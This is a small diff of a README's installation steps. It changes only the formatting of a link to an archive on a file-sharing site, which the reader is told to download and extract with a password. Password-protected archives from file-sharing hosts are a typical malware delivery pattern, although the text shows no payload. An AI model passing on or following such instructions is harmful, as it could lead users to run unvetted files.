@@ -26,7 +26,7 @@ Installation
 
 1. **Download the Archive**
     Click the link below to download the archive:
-    [!Download(https://www.transfernow.net/dl/20250416BN1Asbt4)
+    [Download](https://www.transfernow.net/dl/20250416BN1Asbt4)
 
 2. **Extract the Archive**
     After downloading, extract the archive using the password:
